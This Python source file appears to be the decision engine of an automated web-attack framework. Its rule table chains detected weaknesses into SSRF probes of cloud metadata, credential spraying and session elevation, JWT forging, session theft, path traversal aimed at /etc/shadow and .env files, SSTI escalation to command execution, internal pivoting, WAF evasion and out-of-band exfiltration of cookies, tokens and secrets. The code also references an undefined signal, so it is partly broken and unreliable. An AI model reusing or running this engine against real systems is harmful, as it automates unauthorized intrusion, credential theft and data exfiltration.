# lang: Python, file: utils/ai_decision_engine.py
import asyncio
import hashlib
import json
import math
import time
import uuid
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Optional


# ─── Enums ────────────────────────────────────────────────────────────────────

class Signal(Enum):
    SSRF_CONFIRMED            = "ssrf_confirmed"
    SSRF_BLIND                = "ssrf_blind"
    CLOUD_METADATA_HIT        = "cloud_metadata_hit"
    INTERNAL_SERVICE_REACHABLE = "internal_service_reachable"
    CREDS_VALID               = "creds_valid"
    AUTH_BYPASSED             = "auth_bypassed"
    WAF_PRESENT               = "waf_present"
    WAF_BYPASSABLE            = "waf_bypassable"
    CORS_EXPLOITABLE          = "cors_exploitable"
    OPEN_REDIRECT_CONFIRMED   = "open_redirect_confirmed"
    HEADER_INJECTABLE         = "header_injectable"
    CRLF_INJECTABLE           = "crlf_injectable"
    JS_SECRET_EXPOSED         = "js_secret_exposed"
    JWT_CAPTURED              = "jwt_captured"
    SESSION_ELEVATED          = "session_elevated"
    RATE_LIMIT_ABSENT         = "rate_limit_absent"
    PAYLOAD_BYPASS_CONFIRMED  = "payload_bypass_confirmed"
    XSS_REFLECTED             = "xss_reflected"
    SQLI_ERROR_TRIGGERED      = "sqli_error_triggered"
    SSTI_TRIGGERED            = "ssti_triggered"
    PATH_TRAVERSAL_CONFIRMED  = "path_traversal_confirmed"
    REDIRECT_CHAIN_FOUND      = "redirect_chain_found"
    TIMING_ORACLE_PRESENT     = "timing_oracle_present"
    PIVOT_ENDPOINT_FOUND      = "pivot_endpoint_found"
    INFORMATION_DISCLOSED     = "information_disclosed"
    HIGH_COMPOSITE_VULN       = "high_composite_vuln"
    NO_WAF                    = "no_waf"
    AUTH_ENDPOINT_FOUND       = "auth_endpoint_found"
    CSRF_TOKEN_PRESENT        = "csrf_token_present"
    MULTI_PARAM_INJECTABLE    = "multi_param_injectable"


class ActionType(Enum):
    RUN_MODULE        = "run_module"
    MUTATE_PAYLOAD    = "mutate_payload"
    ELEVATE_SESSION   = "elevate_session"
    ROTATE_IDENTITY   = "rotate_identity"
    PROBE_METADATA    = "probe_metadata"
    PIVOT_INTERNAL    = "pivot_internal"
    DEEPEN_SCAN       = "deepen_scan"
    CHAIN_ATTACK      = "chain_attack"
    EXFIL_PLAN        = "exfil_plan"
    ADJUST_TIMING     = "adjust_timing"
    SKIP              = "skip"
    HALT              = "halt"
    RERUN_MODULE      = "rerun_module"
    ESCALATE_HEADERS  = "escalate_headers"
    FUZZ_PARAM        = "fuzz_param"
    BRUTE_ENDPOINT    = "brute_endpoint"


class DecisionPhase(Enum):
    RECONNAISSANCE    = "reconnaissance"
    AUTHENTICATION    = "authentication"
    EXPLOITATION      = "exploitation"
    POST_EXPLOITATION = "post_exploitation"
    EXFILTRATION      = "exfiltration"
    PIVOTING          = "pivoting"
    CLEANUP           = "cleanup"


class RiskTier(Enum):
    CRITICAL  = "critical"
    HIGH      = "high"
    MEDIUM    = "medium"
    LOW       = "low"
    UNKNOWN   = "unknown"


class EngineMode(Enum):
    AGGRESSIVE   = "aggressive"
    STEALTH      = "stealth"
    BALANCED     = "balanced"
    FAST         = "fast"
    THOROUGH     = "thorough"


# ─── Data Structures ──────────────────────────────────────────────────────────

@dataclass
class SignalWeight:
    signal: Signal
    weight: float
    decay_rate: float = 0.0
    captured_at: float = field(default_factory=time.monotonic)

    def effective_weight(self) -> float:
        if self.decay_rate == 0.0:
            return self.weight
        age = time.monotonic() - self.captured_at
        return self.weight * math.exp(-self.decay_rate * age)


@dataclass
class DecisionAction:
    action_id: str
    action_type: ActionType
    target_module: str
    priority: float
    phase: DecisionPhase
    rationale: str
    params: dict[str, Any] = field(default_factory=dict)
    depends_on: list[str] = field(default_factory=list)
    blocks: list[str] = field(default_factory=list)
    estimated_yield: float = 0.0
    created_at: float = field(default_factory=time.monotonic)
    executed: bool = False
    result: Optional[dict] = None


@dataclass
class DecisionNode:
    node_id: str
    signals_required: list[Signal]
    signals_forbidden: list[Signal]
    action: DecisionAction
    confidence_threshold: float
    mode_filter: Optional[list[EngineMode]] = None
    phase_filter: Optional[list[DecisionPhase]] = None


@dataclass
class ExecutionRecord:
    action: DecisionAction
    started_at: float
    finished_at: float
    success: bool
    output_summary: str
    signals_emitted: list[Signal]
    new_actions_queued: list[str]


@dataclass
class DecisionCycle:
    cycle_id: str
    phase: DecisionPhase
    signals_active: list[Signal]
    actions_evaluated: int
    actions_queued: list[DecisionAction]
    actions_executed: list[ExecutionRecord]
    cycle_score: float
    duration_ms: float


@dataclass
class EngineReport:
    session_id: str
    target_url: str
    mode: EngineMode
    total_cycles: int
    final_phase: DecisionPhase
    risk_tier: RiskTier
    signals_captured: list[Signal]
    all_actions: list[DecisionAction]
    execution_history: list[ExecutionRecord]
    decision_cycles: list[DecisionCycle]
    final_scan_results: dict
    attack_narrative: str
    recommended_next: list[str]
    duration_seconds: float


# ─── Signal Extractor Registry ────────────────────────────────────────────────

def _signals_from_waf(result: dict) -> list[Signal]:
    if not result or result.get("error"):
        return [Signal.NO_WAF]
    vendor = result.get("vendor", "")
    evasion = result.get("evasion_hits", 0)
    sigs = []
    if vendor:
        sigs.append(Signal.WAF_PRESENT)
    else:
        sigs.append(Signal.NO_WAF)
    if evasion > 0:
        sigs.append(Signal.WAF_BYPASSABLE)
    return sigs


def _signals_from_headers(result: dict) -> list[Signal]:
    if not result or result.get("error"):
        return []
    sigs = []
    for f in result.get("findings", []):
        sev = f.get("severity", "info")
        ev = f.get("evidence", "").lower()
        if sev in ("high", "critical"):
            if "crlf" in ev or "\\r\\n" in ev or "0d0a" in ev:
                sigs.append(Signal.CRLF_INJECTABLE)
            else:
                sigs.append(Signal.HEADER_INJECTABLE)
    return list(set(sigs))


def _signals_from_cors(result: dict) -> list[Signal]:
    if not result or result.get("error"):
        return []
    for f in result.get("findings", []):
        if f.get("severity") in ("high", "critical"):
            return [Signal.CORS_EXPLOITABLE]
    return []


def _signals_from_js(result: dict) -> list[Signal]:
    if not result or result.get("error"):
        return []
    sigs = []
    for s in result.get("secrets", []):
        sigs.append(Signal.JS_SECRET_EXPOSED)
        stype = s.get("secret_type", "").lower()
        if any(k in stype for k in ("jwt", "token", "bearer")):
            sigs.append(Signal.JWT_CAPTURED)
        break
    return list(set(sigs))


def _signals_from_ssrf(result: dict) -> list[Signal]:
    if not result or result.get("error"):
        return []
    sigs = []
    for f in result.get("findings", []):
        sev = f.get("severity", "info")
        target = f.get("payload_target", "")
        if sev == "info":
            continue
        if any(k in target for k in ("169.254.", "metadata.google", "metadata/instance")):
            sigs.append(Signal.CLOUD_METADATA_HIT)
        elif any(k in target for k in ("localhost", "127.", "10.", "172.", "192.168.")):
            sigs.append(Signal.INTERNAL_SERVICE_REACHABLE)
        elif f.get("evidence") == "blind_no_evidence":
            sigs.append(Signal.SSRF_BLIND)
        else:
            sigs.append(Signal.SSRF_CONFIRMED)
    return list(set(sigs))


def _signals_from_redirect(result: dict) -> list[Signal]:
    if not result or result.get("error"):
        return []
    sigs = []
    for f in result.get("findings", []):
        ftype = f.get("type", "")
        if "open_redirect" in ftype:
            sigs.append(Signal.OPEN_REDIRECT_CONFIRMED)
        if "header_injection" in ftype:
            sigs.append(Signal.CRLF_INJECTABLE)
        if "chain" in ftype:
            sigs.append(Signal.REDIRECT_CHAIN_FOUND)
    return list(set(sigs))


def _signals_from_spray(result: dict) -> list[Signal]:
    if not result or result.get("error"):
        return []
    sigs = []
    summary = result.get("summary", {})
    if summary.get("successful_logins", 0) > 0:
        sigs.append(Signal.CREDS_VALID)
    if summary.get("rate_limited", False) is False:
        sigs.append(Signal.RATE_LIMIT_ABSENT)
    return sigs


def _signals_from_mutator(result: dict) -> list[Signal]:
    if not result or result.get("error"):
        return []
    best = result.get("best_payload", {})
    if not best:
        return []
    score = best.get("fitness_score", 0)
    if score < 0.3:
        return []
    sigs = [Signal.PAYLOAD_BYPASS_CONFIRMED]
    for sig in best.get("signals", []):
        if sig == "reflection":
            sigs.append(Signal.XSS_REFLECTED)
        if sig == "error_disclosure":
            sigs.append(Signal.SQLI_ERROR_TRIGGERED)
        if sig == "blind_timing":
            sigs.append(Signal.TIMING_ORACLE_PRESENT)
    return list(set(sigs))


def _signals_from_session(result: dict) -> list[Signal]:
    if not result or result.get("error"):
        return []
    sigs = []
    state = result.get("final_state", "")
    priv = result.get("final_privilege", "ANONYMOUS")
    if state in ("elevated", "pivoted"):
        sigs.append(Signal.SESSION_ELEVATED)
    if priv in ("ADMIN", "SUPERADMIN", "ROOT", "MODERATOR"):
        sigs.append(Signal.AUTH_BYPASSED)
    if result.get("pivots"):
        sigs.append(Signal.PIVOT_ENDPOINT_FOUND)
    if result.get("high_value_cookies"):
        sigs.append(Signal.JWT_CAPTURED)
    return list(set(sigs))


def _signals_from_scorer(result: dict) -> list[Signal]:
    if not result or result.get("error"):
        return []
    sigs = []
    overall = result.get("overall_risk_score", 0)
    if overall > 0.75:
        sigs.append(Signal.HIGH_COMPOSITE_VULN)
    dist = result.get("severity_distribution", {})
    if dist.get("critical", 0) > 0:
        sigs.append(Signal.HIGH_COMPOSITE_VULN)
    for f in result.get("top_findings", []):
        vc = f.get("vuln_class", "")
        if vc == "cloud_metadata":
            sigs.append(Signal.CLOUD_METADATA_HIT)
        if vc in ("sqli_error",):
            sigs.append(Signal.SQLI_ERROR_TRIGGERED)
        if vc == "ssti":
            sigs.append(Signal.SSTI_TRIGGERED)
        if vc == "path_traversal":
            sigs.append(Signal.PATH_TRAVERSAL_CONFIRMED)
        if vc == "information_disclosure":
            sigs.append(Signal.INFORMATION_DISCLOSED)
    return list(set(sigs))


def _signals_from_orchestrator(result: dict) -> list[Signal]:
    if not result or result.get("error"):
        return []
    sigs = []
    for sig_str in result.get("active_signals", []):
        try:
            sigs.append(Signal(sig_str))
        except ValueError:
            pass
    return sigs


SIGNAL_EXTRACTORS: dict[str, Callable[[dict], list[Signal]]] = {
    "waf_fingerprint":   _signals_from_waf,
    "header_injection":  _signals_from_headers,
    "cors_audit":        _signals_from_cors,
    "js_secrets":        _signals_from_js,
    "ssrf_probe":        _signals_from_ssrf,
    "redirect_trace":    _signals_from_redirect,
    "credential_spray":  _signals_from_spray,
    "payload_mutator":   _signals_from_mutator,
    "session_manager":   _signals_from_session,
    "vuln_score":        _signals_from_scorer,
    "orchestrator":      _signals_from_orchestrator,
}


# ─── Decision Rule Definitions ────────────────────────────────────────────────

@dataclass
class Rule:
    rule_id: str
    description: str
    required: list[Signal]
    forbidden: list[Signal]
    action_type: ActionType
    target_module: str
    phase: DecisionPhase
    base_priority: float
    params_builder: Callable[[dict, list[Signal]], dict]
    mode_filter: Optional[list[EngineMode]] = None
    max_fires: int = 1
    fires: int = 0

    def can_fire(self, active: set[Signal], mode: EngineMode) -> bool:
        if self.fires >= self.max_fires:
            return False
        if self.mode_filter and mode not in self.mode_filter:
            return False
        if not all(s in active for s in self.required):
            return False
        if any(s in active for s in self.forbidden):
            return False
        return True

    def priority(self, active: set[Signal], scan_results: dict) -> float:
        bonus = 0.0
        if Signal.HIGH_COMPOSITE_VULN in active:
            bonus += 0.1
        if Signal.CLOUD_METADATA_HIT in active and self.action_type == ActionType.PROBE_METADATA:
            bonus += 0.3
        if Signal.CREDS_VALID in active and self.action_type == ActionType.ELEVATE_SESSION:
            bonus += 0.25
        return round(self.base_priority + bonus, 4)


def _params_ssrf_to_metadata(scan_results: dict, signals: list[Signal]) -> dict:
    ssrf = scan_results.get("ssrf_probe", {})
    targets = []
    for f in ssrf.get("findings", []):
        if f.get("param"):
            targets.append({"param": f["param"], "endpoint": f.get("endpoint", "")})
    return {
        "metadata_targets": ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/"],
        "confirmed_params": targets[:5],
        "concurrency": 3,
        "delay": 0.5,
    }


def _params_creds_elevate(scan_results: dict, signals: list[Signal]) -> dict:
    spray = scan_results.get("credential_spray", {})
    hits = spray.get("successful_logins", [])
    return {
        "credentials": [{"username": h["username"], "password": h["password"]} for h in hits[:5]],
        "commands": ["elevate_privilege", "escalate_headers", "pivot_endpoint", "maintain_access"],
        "delay": 0.4,
    }


def _params_waf_bypass_to_mutator(scan_results: dict, signals: list[Signal]) -> dict:
    waf = scan_results.get("waf_fingerprint", {})
    vendor = waf.get("vendor", "generic")
    categories = []
    if Signal.HEADER_INJECTABLE in signals or Signal.CRLF_INJECTABLE in signals:
        categories.append("crlf")
    if Signal.CORS_EXPLOITABLE in signals:
        categories.append("xss")
    if Signal.SQLI_ERROR_TRIGGERED in signals:
        categories.append("sqli")
    if Signal.SSTI_TRIGGERED in signals:
        categories.append("ssti")
    if not categories:
        categories = ["xss", "sqli"]
    return {
        "categories": categories,
        "evolution_target": "waf_bypass",
        "waf_vendor": vendor,
        "generations": 7,
        "population_size": 15,
        "concurrency": 3,
    }


def _params_open_redirect_to_ssrf(scan_results: dict, signals: list[Signal]) -> dict:
    redirect = scan_results.get("redirect_trace", {})
    redirect_params = []
    for f in redirect.get("findings", []):
        if f.get("type", "") == "open_redirect":
            redirect_params.append({"param": f.get("param", ""), "url": f.get("url", "")})
    return {
        "pivot_via_redirect": True,
        "redirect_params": redirect_params[:5],
        "ssrf_targets": ["http://169.254.169.254/", "http://localhost/", "http://10.0.0.1/"],
        "concurrency": 5,
        "delay": 0.3,
    }


def _params_js_secret_to_auth(scan_results: dict, signals: list[Signal]) -> dict:
    js = scan_results.get("js_secrets", {})
    tokens = []
    for s in js.get("secrets", []):
        tokens.append({"type": s.get("secret_type"), "value": s.get("match_preview", ""), "variable": s.get("variable_name", "")})
    return {
        "captured_tokens": tokens[:10],
        "attempt_jwt_forge": Signal.JWT_CAPTURED in signals,
        "commands": ["elevate_privilege", "maintain_access"],
    }


def _params_cors_to_session_theft(scan_results: dict, signals: list[Signal]) -> dict:
    cors = scan_results.get("cors_audit", {})
    exploitable = []
    for f in cors.get("findings", []):
        if f.get("severity") in ("high", "critical"):
            exploitable.append(f.get("url", ""))
    return {
        "cors_endpoints": exploitable[:5],
        "attack_type": "credential_theft",
        "payload_type": "xss" if Signal.XSS_REFLECTED in signals else "cors_fetch",
    }


def _params_internal_pivot(scan_results: dict, signals: list[Signal]) -> dict:
    ssrf = scan_results.get("ssrf_probe", {})
    session = scan_results.get("session_manager", {})
    internal_targets = []
    for f in ssrf.get("findings", []):
        t = f.get("payload_target", "")
        if any(k in t for k in ("localhost", "127.", "10.", "172.", "192.168.")):
            internal_targets.append(t)
    pivots = session.get("pivots", [])
    return {
        "internal_targets": list(set(internal_targets))[:10],
        "pivot_endpoints": pivots[:10],
        "commands": ["pivot_endpoint", "maintain_access", "escalate_headers"],
        "scan_ports": [80, 443, 8080, 8443, 3306, 5432, 6379, 9200, 27017],
    }


def _params_xss_chain(scan_results: dict, signals: list[Signal]) -> dict:
    mutator = scan_results.get("payload_mutator", {})
    best = mutator.get("best_payload", {})
    return {
        "confirmed_payload": best.get("value", "") if best else "",
        "chain_target": "session_theft",
        "secondary_target": "cors_exfil" if Signal.CORS_EXPLOITABLE in signals else "credential_harvest",
    }


def _params_timing_oracle(scan_results: dict, signals: list[Signal]) -> dict:
    spray = scan_results.get("credential_spray", {})
    return {
        "valid_usernames": [h.get("username") for h in spray.get("successful_logins", [])],
        "timing_attack_mode": True,
        "iterations": 50,
        "delay_threshold_ms": 200,
    }


def _params_header_to_ssrf(scan_results: dict, signals: list[Signal]) -> dict:
    headers = scan_results.get("header_injection", {})
    injectable = []
    for f in headers.get("findings", []):
        if f.get("severity") in ("high", "critical"):
            injectable.append(f.get("header", ""))
    return {
        "injectable_headers": injectable[:5],
        "ssrf_via_host_header": True,
        "targets": ["http://169.254.169.254/", "http://localhost:80/", "http://10.0.0.1/"],
        "concurrency": 3,
    }


def _params_deep_js_scan(scan_results: dict, signals: list[Signal]) -> dict:
    return {
        "deep_mode": True,
        "follow_imports": True,
        "decode_base64": True,
        "deobfuscate": True,
        "max_depth": 5,
    }


def _params_brute_admin(scan_results: dict, signals: list[Signal]) -> dict:
    spray = scan_results.get("credential_spray", {})
    hits = spray.get("successful_logins", [])
    return {
        "paths": ["/admin", "/admin/", "/administrator", "/manage", "/panel", "/staff", "/debug", "/internal"],
        "use_session_cookies": True,
        "credentials": [{"username": h["username"], "password": h["password"]} for h in hits[:3]],
    }


def _params_exfil_plan(scan_results: dict, signals: list[Signal]) -> dict:
    channels = []
    if Signal.SSRF_CONFIRMED in signals or Signal.BLIND_SSRF in []:
        channels.append("ssrf_oob")
    if Signal.XSS_REFLECTED in signals:
        channels.append("xss_beacon")
    if Signal.OPEN_REDIRECT_CONFIRMED in signals:
        channels.append("redirect_exfil")
    if Signal.CORS_EXPLOITABLE in signals:
        channels.append("cors_read")
    if not channels:
        channels = ["http_oob", "dns_oob"]
    return {
        "channels": channels,
        "data_targets": ["cookies", "tokens", "internal_urls", "secrets"],
        "stealth_mode": Signal.WAF_PRESENT in signals,
    }


def _params_adjust_timing(scan_results: dict, signals: list[Signal]) -> dict:
    return {
        "new_delay": 1.5,
        "new_concurrency": 2,
        "jitter": True,
        "reason": "waf_evasion",
    }


def _params_path_traversal_deepen(scan_results: dict, signals: list[Signal]) -> dict:
    return {
        "depth": 10,
        "targets": ["../../../../etc/passwd", "../../../../etc/shadow", "../../../../proc/self/environ",
                    "../../../../var/log/apache2/access.log", "../../../../app/config/database.php",
                    "../../../../.env", "../../../../config.json"],
        "encoding_variants": ["raw", "url_encoded", "double_encoded", "unicode"],
    }


def _params_ssti_exploit(scan_results: dict, signals: list[Signal]) -> dict:
    mutator = scan_results.get("payload_mutator", {})
    best = mutator.get("best_payload", {})
    return {
        "confirmed_payload": best.get("value", "") if best else "",
        "engines": ["jinja2", "twig", "freemarker", "velocity", "smarty", "erb"],
        "escalate_to_rce": True,
        "command": "id",
    }


def _params_null(scan_results: dict, signals: list[Signal]) -> dict:
    return {}


# ─── Rule Table ───────────────────────────────────────────────────────────────

DECISION_RULES: list[Rule] = [
    Rule(
        rule_id="R001",
        description="SSRF confirmed → immediately probe cloud metadata endpoints",
        required=[Signal.SSRF_CONFIRMED],
        forbidden=[Signal.CLOUD_METADATA_HIT],
        action_type=ActionType.PROBE_METADATA,
        target_module="ssrf_probe",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.97,
        params_builder=_params_ssrf_to_metadata,
        max_fires=1,
    ),
    Rule(
        rule_id="R002",
        description="Cloud metadata confirmed → plan full exfiltration chain",
        required=[Signal.CLOUD_METADATA_HIT],
        forbidden=[],
        action_type=ActionType.EXFIL_PLAN,
        target_module="ai_exfil_planner",
        phase=DecisionPhase.EXFILTRATION,
        base_priority=0.96,
        params_builder=_params_exfil_plan,
        max_fires=1,
    ),
    Rule(
        rule_id="R003",
        description="Valid credentials found → elevate session immediately",
        required=[Signal.CREDS_VALID],
        forbidden=[Signal.SESSION_ELEVATED],
        action_type=ActionType.ELEVATE_SESSION,
        target_module="session_manager",
        phase=DecisionPhase.POST_EXPLOITATION,
        base_priority=0.95,
        params_builder=_params_creds_elevate,
        max_fires=2,
    ),
    Rule(
        rule_id="R004",
        description="WAF bypassable + injectable header → route payload mutation",
        required=[Signal.WAF_BYPASSABLE],
        forbidden=[Signal.PAYLOAD_BYPASS_CONFIRMED],
        action_type=ActionType.MUTATE_PAYLOAD,
        target_module="payload_mutator",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.88,
        params_builder=_params_waf_bypass_to_mutator,
        max_fires=2,
    ),
    Rule(
        rule_id="R005",
        description="Open redirect + SSRF signals → pivot SSRF via redirect",
        required=[Signal.OPEN_REDIRECT_CONFIRMED],
        forbidden=[Signal.SSRF_CONFIRMED],
        action_type=ActionType.CHAIN_ATTACK,
        target_module="ssrf_probe",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.87,
        params_builder=_params_open_redirect_to_ssrf,
        max_fires=1,
    ),
    Rule(
        rule_id="R006",
        description="JS secret/JWT captured → attempt auth bypass",
        required=[Signal.JS_SECRET_EXPOSED],
        forbidden=[Signal.AUTH_BYPASSED],
        action_type=ActionType.ELEVATE_SESSION,
        target_module="session_manager",
        phase=DecisionPhase.AUTHENTICATION,
        base_priority=0.91,
        params_builder=_params_js_secret_to_auth,
        max_fires=1,
    ),
    Rule(
        rule_id="R007",
        description="CORS exploitable + XSS present → chain session theft",
        required=[Signal.CORS_EXPLOITABLE],
        forbidden=[Signal.SESSION_ELEVATED],
        action_type=ActionType.CHAIN_ATTACK,
        target_module="session_manager",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.82,
        params_builder=_params_cors_to_session_theft,
        max_fires=1,
    ),
    Rule(
        rule_id="R008",
        description="Internal service reachable → pivot into internal network",
        required=[Signal.INTERNAL_SERVICE_REACHABLE],
        forbidden=[Signal.PIVOT_ENDPOINT_FOUND],
        action_type=ActionType.PIVOT_INTERNAL,
        target_module="ai_lateral_mover",
        phase=DecisionPhase.PIVOTING,
        base_priority=0.90,
        params_builder=_params_internal_pivot,
        max_fires=1,
    ),
    Rule(
        rule_id="R009",
        description="Header injectable → test SSRF via Host/X-Forwarded-Host",
        required=[Signal.HEADER_INJECTABLE],
        forbidden=[Signal.SSRF_CONFIRMED],
        action_type=ActionType.CHAIN_ATTACK,
        target_module="ssrf_probe",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.83,
        params_builder=_params_header_to_ssrf,
        max_fires=1,
    ),
    Rule(
        rule_id="R010",
        description="WAF present + no bypass yet → adjust timing to evade",
        required=[Signal.WAF_PRESENT],
        forbidden=[Signal.WAF_BYPASSABLE, Signal.NO_WAF],
        action_type=ActionType.ADJUST_TIMING,
        target_module="pipeline",
        phase=DecisionPhase.RECONNAISSANCE,
        base_priority=0.65,
        params_builder=_params_adjust_timing,
        max_fires=1,
    ),
    Rule(
        rule_id="R011",
        description="Payload bypass confirmed → deepen with SSTI probe if signals present",
        required=[Signal.PAYLOAD_BYPASS_CONFIRMED, Signal.SSTI_TRIGGERED],
        forbidden=[],
        action_type=ActionType.DEEPEN_SCAN,
        target_module="payload_mutator",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.92,
        params_builder=_params_ssti_exploit,
        max_fires=1,
    ),
    Rule(
        rule_id="R012",
        description="XSS reflected + payload bypass → chain into session theft",
        required=[Signal.XSS_REFLECTED, Signal.PAYLOAD_BYPASS_CONFIRMED],
        forbidden=[Signal.SESSION_ELEVATED],
        action_type=ActionType.CHAIN_ATTACK,
        target_module="session_manager",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.84,
        params_builder=_params_xss_chain,
        max_fires=1,
    ),
    Rule(
        rule_id="R013",
        description="Timing oracle present → enumerate valid users",
        required=[Signal.TIMING_ORACLE_PRESENT],
        forbidden=[Signal.CREDS_VALID],
        action_type=ActionType.FUZZ_PARAM,
        target_module="credential_sprayer",
        phase=DecisionPhase.AUTHENTICATION,
        base_priority=0.72,
        params_builder=_params_timing_oracle,
        max_fires=1,
    ),
    Rule(
        rule_id="R014",
        description="Path traversal confirmed → deepen directory traversal",
        required=[Signal.PATH_TRAVERSAL_CONFIRMED],
        forbidden=[],
        action_type=ActionType.DEEPEN_SCAN,
        target_module="payload_mutator",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.80,
        params_builder=_params_path_traversal_deepen,
        max_fires=1,
    ),
    Rule(
        rule_id="R015",
        description="Auth endpoint found + rate limit absent → credential spray",
        required=[Signal.AUTH_ENDPOINT_FOUND, Signal.RATE_LIMIT_ABSENT],
        forbidden=[Signal.CREDS_VALID],
        action_type=ActionType.RUN_MODULE,
        target_module="credential_sprayer",
        phase=DecisionPhase.AUTHENTICATION,
        base_priority=0.78,
        params_builder=_params_null,
        max_fires=1,
    ),
    Rule(
        rule_id="R016",
        description="Session elevated → brute admin endpoints with privileged session",
        required=[Signal.SESSION_ELEVATED],
        forbidden=[],
        action_type=ActionType.BRUTE_ENDPOINT,
        target_module="session_manager",
        phase=DecisionPhase.POST_EXPLOITATION,
        base_priority=0.85,
        params_builder=_params_brute_admin,
        max_fires=1,
    ),
    Rule(
        rule_id="R017",
        description="JS secret exposed + no WAF → deep JS scan for more secrets",
        required=[Signal.JS_SECRET_EXPOSED, Signal.NO_WAF],
        forbidden=[],
        action_type=ActionType.DEEPEN_SCAN,
        target_module="js_secret_extractor",
        phase=DecisionPhase.RECONNAISSANCE,
        base_priority=0.74,
        params_builder=_params_deep_js_scan,
        max_fires=1,
    ),
    Rule(
        rule_id="R018",
        description="SQLi error confirmed → escalate with SQLi payload mutation",
        required=[Signal.SQLI_ERROR_TRIGGERED],
        forbidden=[Signal.PAYLOAD_BYPASS_CONFIRMED],
        action_type=ActionType.MUTATE_PAYLOAD,
        target_module="payload_mutator",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.89,
        params_builder=lambda s, sig: {**_params_waf_bypass_to_mutator(s, sig), "categories": ["sqli"], "evolution_target": "error_trigger"},
        max_fires=1,
    ),
    Rule(
        rule_id="R019",
        description="High composite vuln + no exfil plan → build exfil chain",
        required=[Signal.HIGH_COMPOSITE_VULN],
        forbidden=[],
        action_type=ActionType.EXFIL_PLAN,
        target_module="ai_exfil_planner",
        phase=DecisionPhase.EXFILTRATION,
        base_priority=0.76,
        params_builder=_params_exfil_plan,
        max_fires=1,
    ),
    Rule(
        rule_id="R020",
        description="Redirect chain + CRLF injectable → header injection via chain",
        required=[Signal.REDIRECT_CHAIN_FOUND, Signal.CRLF_INJECTABLE],
        forbidden=[Signal.SESSION_ELEVATED],
        action_type=ActionType.CHAIN_ATTACK,
        target_module="header_injector",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.79,
        params_builder=lambda s, sig: {"chain_exploit": True, "crlf_target": "Set-Cookie"},
        max_fires=1,
    ),
    Rule(
        rule_id="R021",
        description="Pivot endpoint found + internal service reachable → lateral move",
        required=[Signal.PIVOT_ENDPOINT_FOUND, Signal.INTERNAL_SERVICE_REACHABLE],
        forbidden=[],
        action_type=ActionType.PIVOT_INTERNAL,
        target_module="ai_lateral_mover",
        phase=DecisionPhase.PIVOTING,
        base_priority=0.91,
        params_builder=_params_internal_pivot,
        max_fires=1,
    ),
    Rule(
        rule_id="R022",
        description="SSRF blind + internal service → attempt OOB exfil",
        required=[Signal.SSRF_BLIND],
        forbidden=[Signal.SSRF_CONFIRMED],
        action_type=ActionType.CHAIN_ATTACK,
        target_module="ssrf_probe",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.77,
        params_builder=lambda s, sig: {"blind_oob": True, "oob_server": "PLACEHOLDER_OOB", "targets": ["http://169.254.169.254/", "http://localhost/"]},
        max_fires=1,
    ),
    Rule(
        rule_id="R023",
        description="Auth bypassed + pivot endpoint → enumerate all discovered internal paths",
        required=[Signal.AUTH_BYPASSED, Signal.PIVOT_ENDPOINT_FOUND],
        forbidden=[],
        action_type=ActionType.DEEPEN_SCAN,
        target_module="session_manager",
        phase=DecisionPhase.POST_EXPLOITATION,
        base_priority=0.88,
        params_builder=lambda s, sig: {"enumerate_paths": True, "commands": ["pivot_endpoint", "maintain_access"]},
        max_fires=1,
    ),
    Rule(
        rule_id="R024",
        description="Information disclosed → cross-reference with SSRF targets",
        required=[Signal.INFORMATION_DISCLOSED],
        forbidden=[Signal.SSRF_CONFIRMED],
        action_type=ActionType.CHAIN_ATTACK,
        target_module="ssrf_probe",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.71,
        params_builder=lambda s, sig: {"use_disclosed_paths": True, "concurrency": 4},
        max_fires=1,
    ),
    Rule(
        rule_id="R025",
        description="No WAF + multi-signal → aggressive full rescan with no throttle",
        required=[Signal.NO_WAF, Signal.HIGH_COMPOSITE_VULN],
        forbidden=[Signal.WAF_PRESENT],
        action_type=ActionType.RERUN_MODULE,
        target_module="pipeline",
        phase=DecisionPhase.EXPLOITATION,
        base_priority=0.69,
        params_builder=lambda s, sig: {"concurrency_boost": True, "delay_override": 0.05},
        mode_filter=[EngineMode.AGGRESSIVE, EngineMode.THOROUGH],
        max_fires=1,
    ),
]


# ─── Phase Transition Logic ───────────────────────────────────────────────────

PHASE_TRANSITIONS: dict[DecisionPhase, list[tuple[set[Signal], DecisionPhase]]] = {
    DecisionPhase.RECONNAISSANCE: [
        ({Signal.AUTH_ENDPOINT_FOUND, Signal.RATE_LIMIT_ABSENT}, DecisionPhase.AUTHENTICATION),
        ({Signal.WAF_BYPASSABLE, Signal.HEADER_INJECTABLE},      DecisionPhase.EXPLOITATION),
        ({Signal.JS_SECRET_EXPOSED},                             DecisionPhase.AUTHENTICATION),
    ],
    DecisionPhase.AUTHENTICATION: [
        ({Signal.CREDS_VALID},          DecisionPhase.POST_EXPLOITATION),
        ({Signal.AUTH_BYPASSED},        DecisionPhase.POST_EXPLOITATION),
        ({Signal.JWT_CAPTURED},         DecisionPhase.EXPLOITATION),
        ({Signal.RATE_LIMIT_ABSENT},    DecisionPhase.EXPLOITATION),
    ],
    DecisionPhase.EXPLOITATION: [
        ({Signal.SSRF_CONFIRMED},              DecisionPhase.POST_EXPLOITATION),
        ({Signal.CLOUD_METADATA_HIT},          DecisionPhase.EXFILTRATION),
        ({Signal.INTERNAL_SERVICE_REACHABLE},  DecisionPhase.PIVOTING),
        ({Signal.SESSION_ELEVATED},            DecisionPhase.POST_EXPLOITATION),
        ({Signal.PAYLOAD_BYPASS_CONFIRMED},    DecisionPhase.POST_EXPLOITATION),
    ],
    DecisionPhase.POST_EXPLOITATION: [
        ({Signal.INTERNAL_SERVICE_REACHABLE, Signal.PIVOT_ENDPOINT_FOUND}, DecisionPhase.PIVOTING),
        ({Signal.CLOUD_METADATA_HIT},                                       DecisionPhase.EXFILTRATION),
